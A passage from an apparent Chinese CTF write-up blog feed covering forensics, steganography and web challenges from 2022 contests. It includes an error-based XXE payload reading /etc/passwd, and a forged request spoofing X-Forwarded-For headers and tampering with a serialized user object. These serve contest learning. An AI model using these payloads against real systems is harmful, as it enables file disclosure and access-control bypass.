pyshark<br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-comment">#解决event loop问题</span><br><span class="hljs-keyword">import</span> nest_asyncio<br>nest_asyncio.apply()<br><br>L_flag= []<br>packets = pyshark.FileCapture(<span class="hljs-string">&#x27;secret.pcapng&#x27;</span>)<br><span class="hljs-keyword">for</span> packet <span class="hljs-keyword">in</span> packets:<br>    <span class="hljs-keyword">for</span> pkt <span class="hljs-keyword">in</span> packet:<br>        <span class="hljs-keyword">if</span> pkt.layer_name == <span class="hljs-string">&quot;icmp&quot;</span>: <br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(pkt.<span class="hljs-built_in">type</span>) != <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">try</span>:<br>                    L_flag.append(<span class="hljs-built_in">int</span>(pkt.data_len))<br>                <span class="hljs-keyword">except</span>:<br>                   <span class="hljs-comment">#没有发送的时候就为0</span><br>                    L_flag.append(<span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">if</span> pkt.layer_name == <span class="hljs-string">&#x27;ip&#x27;</span>:<br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Destination Address: 14.215.177.38&quot;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(pkt):<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;0&#x27;</span>,end=<span class="hljs-string">&#x27;&#x27;</span>)<br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Destination Address: 14.215.177.39&quot;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(pkt):<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;1&#x27;</span>,end=<span class="hljs-string">&#x27;&#x27;</span>)<br><br><span class="hljs-comment">##输出：0111000001100001011100110111001101110111011011110111001001100100011010000011001101110010001100111111111111111111111111111111111111111111111111111111111111111</span><br><br><span class="hljs-comment">#写入数据到文件</span><br><span class="hljs-keyword">import</span> struct<br>m = [<span class="hljs-built_in">int</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> L_flag]<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.bin&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> fp:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> m:<br>        s = struct.pack(<span class="hljs-string">&#x27;B&#x27;</span>,i)<br>        fp.write(s)<br><br><br><br></code></pre></td></tr></table></figure><p>随便找了一个二进制转str的网站</p><p><img src="/../imgs/2022-i%E6%98%A5%E7%A7%8B-%E6%98%A5%E5%AD%A3/image_a0DOFZTs-S.png"></p><p>用密码password3r3解压文件</p><h3 id="Flag-2"><a href="#Flag-2" class="headerlink" title="Flag"></a>Flag</h3><p>flag{efaaf34db0bad8e1888e8f671f3cb7ab}</p><h2 id="Capture-Radiate-Chart"><a href="#Capture-Radiate-Chart" class="headerlink" title="Capture Radiate Chart"></a>Capture Radiate Chart</h2><p>要说什么还得看眼尖，百思不得其解之时就是玩，题目的名字简写CRC，那就用TweakPNG看CRC好了</p><p><img src="/../imgs/2022-i%E6%98%A5%E7%A7%8B-%E6%98%A5%E5%AD%A3/image_KwhW0QFTdB.png"></p><p>嗯，没看出花来，至少看了很久，010editor计算好像也没有报错，感人之际看到了每一个CRC的后两位，52 61 72 21这tama不是rar吗，开始感人的提取数据，懒得动脑，直接导出csv，010正则提，winhex写入，一波梭。（感觉可以编写010脚本，但是今天我才更新了我的010 editor），关于010的Template，直接从官网下。</p><p>解压后，flag.pdf苹果预览可以直接看到（我当时windows电脑没有kali，然后就想传到mac上的kali 噗），但是打开后就看不到了</p><p><img src="/../imgs/2022-i%E6%98%A5%E7%A7%8B-%E6%98%A5%E5%AD%A3/image_9dL4vTOF23.png"></p><h3 id="Flag-3"><a href="#Flag-3" class="headerlink" title="Flag"></a>Flag</h3><p>flag{Create_Remarkable_Ctf}</p><h2 id="PINTU"><a href="#PINTU" class="headerlink" title="PINTU"></a>PINTU</h2><p>网上搜罗了一堆自动拼图的玩意，然后实在太慢，电脑要bug了，看了看图片元数据，发现</p><p>两个原来是保留字节的bfReserved1 2 一直在变化，盲猜是拼图定位，写脚本拼图</p><p><img src="/../imgs/2022-i%E6%98%A5%E7%A7%8B-%E6%98%A5%E5%AD%A3/image_nRBIksMNNL.png"></p><p>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-comment">#分辨率可以任意尝试</span><br>bmp = Image.new(<span class="hljs-string">&#x27;RGB&#x27;</span>, (<span class="hljs-number">2000</span>, <span class="hljs-number">1500</span>))<br><span class="hljs-comment">#总图片量</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">14400</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">r&#x27;./PINTU_2ddfb4c79eefe03a72c5d62199d85d7b/img/&#x27;</span>+ <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&#x27;.bmp&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> b:<br>        r = b.read()<br>        <span class="hljs-comment">#每个*bmp的像素大小</span><br>        loc_x = r[<span class="hljs-number">6</span>]*<span class="hljs-number">32</span><br>        loc_y = r[<span class="hljs-number">8</span>]*<span class="hljs-number">18</span><br>    pintu = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">r&#x27;./PINTU_2ddfb4c79eefe03a72c5d62199d85d7b/img/&#x27;</span>+ <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&#x27;.bmp&#x27;</span>)<br>    bmp.paste(pintu, (loc_x, loc_y))<br>bmp<br><br></code></pre></td></tr></table></figure><h3 id="Flag-4"><a href="#Flag-4" class="headerlink" title="Flag"></a>Flag</h3><p><img src="/../imgs/2022-i%E6%98%A5%E7%A7%8B-%E6%98%A5%E5%AD%A3/image_ePmqNIhPgj.png"></p>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    <category term="ctfwp" scheme="https://www.imfengyuan.info/categories/ctfwp/"/>
    
    
  </entry>
  
  <entry>
    <title>2022-TSTARCTF-Misc/Web-Wp</title>
    <link href="https://www.imfengyuan.info/2022/04/28/T-STAR/"/>
    <id>https://www.imfengyuan.info/2022/04/28/T-STAR/</id>
    <published>2022-04-28T20:11:16.000Z</published>
    <updated>2022-04-28T21:09:16.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2022-T-STAR"><a href="#2022-T-STAR" class="headerlink" title="2022 T-STAR"></a>2022 T-STAR</h1><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul><li><a href="#%E8%B5%9B%E9%A2%98%E4%B8%80">赛题一</a></li><li><a href="#%E8%B5%9B%E9%A2%98%E4%BA%8C">赛题二</a></li><li><a href="#%E8%B5%9B%E9%A2%98%E4%B8%89">赛题三</a></li><li><a href="#%E8%B5%9B%E9%A2%98%E5%9B%9B">赛题四</a></li><li><a href="#%E8%B5%9B%E9%A2%98%E4%BA%94">赛题五</a></li><li><a href="#%E8%B5%9B%E9%A2%98%E5%85%AD">赛题六</a></li><li><a href="#%E6%80%BB%E7%BB%93">总结：</a></li></ul><h2 id="赛题一"><a href="#赛题一" class="headerlink" title="赛题一"></a>赛题一</h2><p>  → 不让扫目录 → 不存在源码泄漏 </p><p>  → 不让爆破手机验证码  &#x3D;&#x3D; 不存在万能验证码 &#x3D;&#x3D; 逻辑漏洞</p><p>  → 上手第一步<strong>F12</strong> 看<strong>Network</strong> 看返回包 → 点击获取验证码 → 看到debug验证码</p><p>  → 上手第二步开启Burp代理，全站全功能狂点，看<strong>Target 的Sitemap</strong>（好像很多小萌新不知道burp的这个功能哦）</p><p><img src="/../imgs/T-STAR/image_DyphgIzrm8.png" alt="img"></p><p>→ 上手第三步全方位测试，info没用、login没用（怎么确定没用？是真的没用。）重点是<strong>like</strong>开始报错了。（我是后来写的wp，之前没有截图，现在服务器用不了了，幸亏这几天打比赛我的burp一直没关）</p><p><img src="/../imgs/T-STAR/image_f-CDQQVZ4i.png" alt="img"></p><p>→ 3修改一下，显示json的问题，baidu搜了一下是json.load()的问题，好像跟反序列化没啥关系。</p><p>→ 上手第四步，全方位百度，我是先搜gunicorn ，我自己也不信，我是在这篇文章看到的</p><p><img src="/../imgs/T-STAR/image_TYGZ0Yc7dB.png" alt="img"></p><p>→ 然后就开始XXE的生涯了。找了几篇文章，其他的师傅也都贴了，我就不贴了，这篇就只记录思路，（其实找了很久，一开始用普通的不行，内部外部dtd都测试一遍，最后发现一篇文章，我看群里的好多师傅已经放出来了，我就不去找那篇文章了，具体原理，看文章吧。可以直接用）</p><p><strong>PAYLOAD</strong></p><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">message</span> [</span></span><br><span class="hljs-meta"><span class="language-xml">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">xxe</span> <span class="hljs-string">&#x27;</span></span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta"><span class="language-xml">        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span></span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta"><span class="language-xml">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexist/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span></span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta"><span class="language-xml">        &amp;#x25;eval;</span></span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta"><span class="language-xml">        &amp;#x25;error;</span></span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta"><span class="language-xml">&#x27;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml"></span></span><span class="language-perl">    %xxe;</span><span class="language-xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="language-xml">]&gt;</span></span><br></code></pre></td></tr></table></figure><p>→ 找了几个flag的路径都没有，简单思考了一下，xxe不能用于文件执行，所以找文件，好像看到很多师傅在群里说找不到flag，但我好像很行云流水的先看当前文件（**&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;**）下的app.py，然后没发现啥，看到from config import * 就看config.py就看到了flag了。终。</p><p><img src="/../imgs/T-STAR/image_UO0OrJnT6S.png" alt="img"></p><p>这题主要是去搞XXE的payload浪费了一点时间，其他步骤其实也很正常，很多同学们可能会在坚持XXE的时候怀疑自己的方向是否正确，<strong>你要坚信自己你就是光！</strong></p><h2 id="赛题二"><a href="#赛题二" class="headerlink" title="赛题二"></a>赛题二</h2><p>是哪里的人，整个界面都nightbaron042，加上TIPS 关注微博 （IP归属地广东）</p><p>试了好几个（成都 [id info里找到的]、北京、广东），最后总不能想到腾讯<strong>深圳</strong>吧。【还真是。想暴打出题人了】</p><h2 id="赛题三"><a href="#赛题三" class="headerlink" title="赛题三"></a>赛题三</h2><p>流量包分析题，对于misc的我还算可以</p><p>→ 上手第一步，纵览全局，浅浅看流量包的内容 都是TCP</p><p>→ 直接发现有两个序列 右键TCP Follow ，看到密码yun202203 ，直接wireshark指定提取方向数据提取，删掉前面多余的几个OKAY</p><p>→ 因为之前做过相关的apk备份ab文件，所以可以直接使用abe.jar提取，</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">java </span>-<span class="hljs-keyword">jar </span>abe.<span class="hljs-keyword">jar </span>unpack xxx. ctf.tar password<br></code></pre></td></tr></table></figure><p>但是不会的同学们也可以直接<strong>github上有解密ab</strong>文件的项目。<a href="https://github.com/lclevy/ab_decrypt">https://github.com/lclevy/ab_decrypt</a></p><p>→ 先是apk不能安装、GDA&#x2F;jadx简单逆向，看到flag1是ip+端口号</p><p>→ mac很委屈看不到隐藏文件，<strong>早知道直接用binwalk解tar包了</strong>。迷茫了好一会，我还用tree检查了一下看是否丢了隐藏文件（结果tree是个废物），然后ll -a 看到了，委屈死了。</p><p>→ 第一层是privatekey，和enc，这个我因为之前用过openssl，在加上同学们应该都知道rsa吧，直接就解出来了。</p><p><img src="/../imgs/T-STAR/image_WRjPSazw5k.png" alt="img"></p><p><strong>payload</strong></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">openssl rsautl -<span class="hljs-built_in">decrypt</span> -<span class="hljs-keyword">in</span> key.en -inkey private_key.pem<br></code></pre></td></tr></table></figure><p>→ 第二层是一堆0和1，这个其实对misc👋也是比较简单的，正常应该都会去看一下他一共多少个，是否可分 m * n 这样，猜编码之类的，但是因为这是841，一个离谱的数字不能被 2 4 8 常见的一些编码除，但是发现是 29 x 29 ，misc手应该都做过二维码的题，所以一下就想到二维码了。</p><p><img src="/../imgs/T-STAR/516C58103742A1CA6F4E44F97300AECD_70ik_csnE9.png" alt="img"></p><p>提取出来是个网址，然后拼接到flag，下载下来一个门禁系统。</p><p>→ 这个由于源码很少，分析起来也很方便，直接C++环境，摸索一下，其实应该很容易就找到key_data的问题，他是怎么赋值的，<strong>他如果没赋值，怎么可能能进最后一次判断</strong>，以及<strong>for循环那么显眼的7次</strong>。跳出循环理解，这个门禁是<strong>7位数</strong>！（这个部分对于C语言薄弱的我还了解什么是位域，学到了）</p><p>我其实纠结了一会，再没用C++环境去思考的时候，我一直想着会报错（python用多的思想）但是我实际试验的时候，不仅没报错 还直接把<strong>management.password[6] 作为了management.key_dat</strong> 赋值，直接无语。</p><p><img src="/../imgs/T-STAR/image_eV6Cktp-DV.png" alt="img"></p><p>然后出Flag。</p><h2 id="赛题四"><a href="#赛题四" class="headerlink" title="赛题四"></a>赛题四</h2><p>赛题四是我认为最简单的一题，其实，我先做的就是赛题四，如果我先做了赛题三，我可能不会通关，真的太套了，烦死了。我都想打出题人。</p><p>首先是去除二维码背景，用pS修复下载文件，<strong>调整绿色通道 然后补一个定位角</strong>（百度一搜行云流水结束）</p><p><img src="/../imgs/T-STAR/image_cDt9_CICTZ.png" alt="img"></p><p>获得地址：<a href="http://public.huoxian.cn/ctf/call_me.zip%EF%BC%8C%E9%9C%80%E8%A6%81%E8%A7%A3%E5%AF%86">http://public.huoxian.cn/ctf/call_me.zip，需要解密</a></p><p>修复压缩包，真的是改了504B就好了很无语。百度一搜，Audition看波形（幸亏我下了全套，群里看好像有师傅听声解码，真可爱），摩斯密码：19910386797，应该不会有人这题做不出来吧。</p><p><a href="https://darknet.hacker5t2ohub.com/">https://darknet.hacker5t2ohub.com/</a></p><h2 id="赛题五"><a href="#赛题五" class="headerlink" title="赛题五"></a>赛题五</h2><p>一开始是真的没有思路（我换了好几个同学号每个都买了一遍，激情小视频都看了。）。</p><p>不像常见的web题，一样Burp Sitemap，各个地方狂试，主要就是在这个地方发现了报错查了是Go的ParseInt</p><p><img src="/../imgs/T-STAR/image_7FXNSgHtQu.png" alt="img"></p><p>然后发现了一篇shop的文章。还是比较久远的了。<a href="https://www.jianshu.com/p/66f8b2bcf2ad">https://www.jianshu.com/p/66f8b2bcf2ad</a></p><p>现在就是构造整数溢出的数值。简单思考了一下就是，有一个if判断，[余额 - 商品数量*商品价格] &lt; 0</p><p>具体参照该链接 ：<a href="https://zhuanlan.zhihu.com/p/400078436">https://zhuanlan.zhihu.com/p/400078436</a>** 毕竟这是腾讯的文章。 **牛呀 </p><p><img src="/../imgs/T-STAR/image_HVYWBYM_kI.png" alt="img"></p><p>然后我就在不断测试，但是我的理想情况是一个比较大的数值，但是不知道为什么。试了很久就是没溢出，最后烦了，<strong>每个临近值都配上余额fuzz一遍</strong>，大概就是这么个情况，他竟然出了，具体可能还是要看源码了。</p><p><img src="/../imgs/T-STAR/image_2sPTR4KpSh.png" alt="img"></p><p>→ 然后在32附近fuzz 成功了，我至今还不是特别理解，因为我拿暴打出题人做测试的时候很大的值也是可以。</p><p>→ 终于来到了最后一步Key Hash了，<strong>这部分我犯了一个常识性错误</strong>🙅，就是认为这个key会是一个小部分的数值，比如64位之类的，导致我最后没忍住氪金cmd5去翻译了一大部分，<strong>结果就是一段话</strong>。</p><p>→ 气得我心疼我的钱。</p><p>somd5，可以先解一部分，<a href="https://www.somd5.com/batch.html">https://www.somd5.com/batch.html</a></p><p><img src="/../imgs/T-STAR/45746517B0B029E78993E16ACAE114F8_tFS46gVpct.png" alt="img"></p><p>其实这个时候，我已经找到这段话了，md，但是我不知道后面是什么，somd5不知道是不是被解崩了，不让我继续解了，靠，无奈氪金。</p><p><img src="/../imgs/T-STAR/image_-n2VODVdMr.png" alt="img"></p><p>说是靠推理，但是我害怕。我不确定，希望赶紧把钱还给我。最后就是那一段话。</p><p>附上这本书的链接，希望小伙伴们好好品读。</p><p><a href="https://ylesanded.targaltinternetis.ee/exercises/file/yl_raamatukrypteering/The_Art_of_Deception.pdf">https://ylesanded.targaltinternetis.ee/exercises/file/yl_raamatukrypteering/The_Art_of_Deception.pdf</a></p><p><img src="/../imgs/T-STAR/image_YRzBMb9stB.png" alt="img"></p><h2 id="赛题六"><a href="#赛题六" class="headerlink" title="赛题六"></a>赛题六</h2><p>终于来到激动人心的时刻，要结束啦！</p><p>先是给了一个文档→<strong>直接全选，清除格式（flag2和一张图片就出来了）。</strong></p><p>→ 然后肯定是对这个图片进行分析 →其他能用的steg、binwalk我全试了一遍，无效</p><p>→ <strong>给了个提示123456，真的我只能想到是加密</strong>，然后就开始一个个一个个解密图片试</p><p>最后看到了一个outguess解密，成功了，确实很切合这个文件名，我在试之前，我就确定我成功了！</p><p><img src="/../imgs/T-STAR/D524DDCDC4EF50B54DD5247D814ACDF8_69h0Zybdez.png" alt="img"></p><p>然后和第四题那个很像，直接放到web上发现是一个web题。然后我就开始想是不是ssrf打内网了，结果啥都没有，就快要自闭的时候，我在想真的不会是flag.php吧。然后我可真是谢了。</p><p><img src="/../imgs/T-STAR/image_9Izvy7CebV.png" alt="img"></p><p>终结。通关。总的来说是真的简单，但是题目很多脑洞，真的很佩服，一天做完的大佬们！抽空三天做完。都是简单的misc 。</p><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>​        补充了一些知识的盲区！总体感受很满意！现在的CTF比赛，也很难见到这样子亲民的MISC了，都是机器学习，各种算法深挖，对待新手小朋友也是很友好的，对待个人赛也是很友好！真的是蛮适合我的一次比赛。只不过这周的比赛是真的多，小伙伴们也要注意自己的身体哇！</p>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    <category term="ctfwp" scheme="https://www.imfengyuan.info/categories/ctfwp/"/>
    
    
  </entry>
  
  <entry>
    <title>2022-MRCTF-Misc-部分Wp</title>
    <link href="https://www.imfengyuan.info/2022/04/23/20220423MRCTF/"/>
    <id>https://www.imfengyuan.info/2022/04/23/20220423MRCTF/</id>
    <published>2022-04-23T22:19:23.000Z</published>
    <updated>2022-04-23T22:20:23.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pdd"><a href="#pdd" class="headerlink" title="pdd"></a>pdd</h1><p>给了一个疑似拼多多的网页</p><p>一开始的思路，是不断的刷助力（我是拉测速网站放Cookie，队友好像是直接改XFF就可以，委屈住了），然后刷到99.999999999发现，再继续，还爆破了一遍action&#x3D;lucky时enc看结果会不会有100，蚌住了，没有只会变小再重来。</p><p><img src="/../imgs/20220423MRCTF/Untitled.png" alt="Untitled"></p><p>确认是后端action&#x3D;start初始化，action&#x3D;lucky修改，action&#x3D;getflag得flag。</p><p>后来，想破解加密（我一定是疯了）</p><p>总结规律</p><p><img src="/../imgs/20220423MRCTF/Untitled%201.png" alt="Untitled"></p><p>得到在测试各种用户名、余额生成的enc，发现这是分组加密，那么其实很显然就是利用分组加密的漏洞（看了*CTF 2021 才发现，但是人家好歹也给了部分源码），但是问题就在，他加密的是哪个字符串，经过测试后（对比对照，总结上述变化的规律，就很清晰的确认，他是把debug中的字符串做加密了。）</p><p>然后构造使用。</p><p><img src="/../imgs/20220423MRCTF/Untitled%202.png" alt="Untitled"></p><p><img src="/../imgs/20220423MRCTF/Untitled%203.png" alt="Untitled"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php">POST /lucky.php?action=getFlag HTTP/<span class="hljs-number">2</span><br>Host: ppd.node3.mrctf.fun<br>Cookie: PHPSESSID=<span class="hljs-number">501</span>bbc1367274320a3fbe47321a6d2fa<br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (X11; Linux x86_64; rv:<span class="hljs-number">83.0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">83.0</span><br>Accept: application/json, text/plain, *<span class="hljs-comment">/*</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate</span><br><span class="hljs-comment">Content-Type: application/json</span><br><span class="hljs-comment">Content-Length: 332</span><br><span class="hljs-comment">Origin: https://ppd.node3.mrctf.fun</span><br><span class="hljs-comment">Referer: https://ppd.node3.mrctf.fun/</span><br><span class="hljs-comment">Sec-Fetch-Dest: empty</span><br><span class="hljs-comment">Sec-Fetch-Mode: cors</span><br><span class="hljs-comment">Sec-Fetch-Site: same-origin</span><br><span class="hljs-comment">X-Forwarded-For: 127.0.0.1</span><br><span class="hljs-comment">X-Originating-Ip: 127.0.0.1</span><br><span class="hljs-comment">X-Remote-Ip: 127.0.0.1</span><br><span class="hljs-comment">X-Remote-Addr: 127.0.0.1</span><br><span class="hljs-comment">Te: trailers</span><br><span class="hljs-comment">Connection: close</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">&#123;&quot;code&quot;:200,&quot;debug&quot;:&quot;O:4:\&quot;User\&quot;:3:&#123;s:8:\&quot;username\&quot;;a:1:&#123;i:0;i:590000000000000;&#125;s:5:\&quot;times\&quot;;i:0;s:5:\&quot;money\&quot;;i:72;&#125;&quot;,&quot;enc&quot;:&quot;SRMr2xR0uuLsQScgoAegYwlz9tod7K3gLTPTcqOGlyY0umqpmC2H3sEcOHJOmzdBs/5+fMCPNhR4pR+FHJWe3eydb1UtueXoodo3h/v8zo9Gh1Qkg/K6xKRBgVNKHksD&quot;,&quot;times&quot;:&quot;10&quot;,&quot;money&quot;:72,&quot;userdb&quot;:&quot;user_1a090ffa2d6ea2822dab48dc6b04d9ee&quot;&#125;</span><br></code></pre></td></tr></table></figure><p><code>flag&#123;xx&#125;</code></p><p><img src="/../imgs/20220423MRCTF/image-20220803101954684.png" alt="image-20220803101954684"></p>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    <category term="ctfwp" scheme="https://www.imfengyuan.info/categories/ctfwp/"/>
    
    
  </entry>
  
</feed>
